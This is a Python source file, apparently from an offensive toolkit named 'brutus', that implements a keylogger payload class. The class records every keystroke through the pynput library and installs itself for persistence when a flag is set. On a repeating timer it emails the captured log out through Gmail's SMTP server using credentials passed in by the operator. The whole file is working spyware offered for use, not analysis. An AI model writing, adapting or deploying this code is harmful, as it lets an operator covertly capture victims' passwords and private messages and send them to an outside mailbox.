"""Implements a keylogger payload
"""
from threading import Timer

from pynput import keyboard  # type: ignore

from brutus.models.PersistenceExecutor import PersistenceExecutor
from brutus.models.ReporterFactory import ReporterFactory, ReportMethod


class Keylogger(ReporterFactory, PersistenceExecutor):
    """Implements a keylogger that sends reports to the given Reporter `reporter_type`

    Inherits:
        ReporterFactory
        PersistenceExecutor
    """

    def __init__(
        self,
        interval: int,
        persistent: bool = True,
        reporter_type: ReportMethod = ReportMethod.EMAIL,
        **reporter_args: list
    ):
        """

        Args:
            interval (int): Report interval
            persistent (bool): Setting this flag will cause the keylogger
                to be persistent
            reporter_type (ReportMethod): The Reporter type.
                Defaults to email via Gmail
            reporter_args (list): Keyword arguments to be passed to the Reporter;
                these will vary
        """
        ReporterFactory.__init__(self, reporter_type=reporter_type)

        PersistenceExecutor.__init__(self)

        # send report at interval
        self.interval = interval

        self.reporter_args = reporter_args

        # keystrokes recorded within `interval`
        self.log = ''

        # reporter method
        self.send_report = self.create_reporter()

        # should the keylogger binary persist itself?
        self.persistent = persistent

    def report_log(self) -> None:
        """Report the log to the Reporter instance"""
        self.send_report(
            host='smtp.gmail.com',  # TODO add config opt
            port=587,
            email=self.reporter_args['email'],
            password=self.reporter_args['password'],
            message=self.log,
        )

        self.log = ''

        timer = Timer(self.interval, self.report_log)
        timer.start()

    def process_keypress(self, key: keyboard.KeyCode) -> None:
        """Process a keypress

        Args:
            key (pynput.keyboard.KeyCode)
        """
        try:
            ephemeral_key = str(key.char)
        except AttributeError:
            if key == key.space:
                ephemeral_key = ' '
            else:
                ephemeral_key = ' ' + str(key) + ' '

        self.log += ephemeral_key

    def start(self) -> None:
        """Start logging keys"""
        if self.persistent:
            self.persist()

        keyboard_listener = keyboard.Listener(on_press=self.process_keypress)

        with keyboard_listener:
            self.report_log()
            keyboard_listener.join()
